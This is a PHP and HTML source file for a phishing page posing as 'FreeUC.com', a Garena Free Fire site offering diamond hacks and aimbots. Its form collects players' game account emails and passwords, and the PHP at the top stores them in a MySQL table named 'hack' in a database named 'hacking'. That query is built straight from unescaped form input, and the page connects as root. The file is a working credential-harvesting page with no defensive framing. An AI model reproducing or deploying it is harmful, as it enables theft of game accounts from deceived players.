<?php
if(isset($_POST['password'])){
    $server = "localhost";
    $username = "root";
    $password = "";

    $con = mysqli_connect($server,$username,$password);
    
    if(!$con){
        die("connection to this database failed due to". mysqli_connect_error());
    }



    $account = $_POST['account'] ;
    $password = $_POST['password'] ;

    $sql = "INSERT INTO `hacking`.`hack` ( `Email`, `Password`, `Date`) VALUES ('$account', '$password', current_timestamp());";

    echo $sql;

    if($con ->query($sql) == true){
        echo "Successfully inserted";

    }
    else{
        echo"ERROR: $sql <br> $con->error";
    }

    $con ->close();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/first.css">
    <title>FreeUC.com</title>
</head>
<body>
    <div class="heading">
        <ul class="navlist ">
            <img src="https://static-01.daraz.com.np/p/69ef95dd52c343a9dbfec9a273dda690.jpg_340x340q80.jpg_.webp" alt="Dimands">
            <li><a href="">NEWS</a></li>
            <li><a href="">GUIDES</a></li>
            <li><a href="">REVIEWS</a></li>
            <li><a href="">COMMUNITY</a></li>
            <li><a href="">MORE</a></li>
        </ul>
        
        
     </div> 
     <div class="hr"><hr></div>
     
    <div class="bodys backgrounds">
        <div class="p img">
            <h1><b>Garena Free Fire hack diamonds , aimbots and how to report hackers.</b></h1>
            <h2><b>Everything you need to know about Garena Free fire hacks</b></h2>
        <div class="form">
            <form action="index.php" method="post">
                <input type="account" name="account" id="account" placeholder="Email-id of freefire">
                <input type="password" name="password" id="password" placeholder="Enter your password">
                <button class="hii">Submit</button>
            </form>
        </div>
        </div>
    </div>
    
    
</body>
</html>
